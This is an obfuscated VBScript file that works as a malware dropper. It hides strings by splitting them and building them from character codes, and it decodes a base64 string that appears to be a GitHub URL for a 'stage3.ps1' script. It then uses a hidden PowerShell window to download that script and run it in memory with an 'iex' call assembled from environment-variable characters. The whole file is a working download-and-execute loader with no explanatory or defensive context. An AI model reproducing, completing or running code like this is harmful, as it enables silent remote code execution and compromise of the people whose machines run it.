Set a = CreateObject("WScript.Shell")

x1 = "W" & "i" & "n" & "d" & "o" & "w" & "S" & "t" & "y" & "l" & "e"
x2 = "Hi" & "dd" & "en"
x3 = Array(105,119,114)
x4 = ""
For Each i In x3
    x4 = x4 & Chr(i)
Next

x5 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL3N0YWdlMy5wczE="
x6 = "$u='" & x5 & "';"
x6 = x6 & "$d=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));"
x6 = x6 & "$r=& " & "$('" & x4 & "') $d;"
x6 = x6 & "& ($env:coMspEc[2+2] + $env:ComSpec[13*2] + $env:coMspeC[5*5]) $r.Content;"

cmd = "powershell.exe -NoLogo -NoProfile -" & x1 & " " & x2 & " -Command """ & x6 & """"

a.Run cmd, 0, False
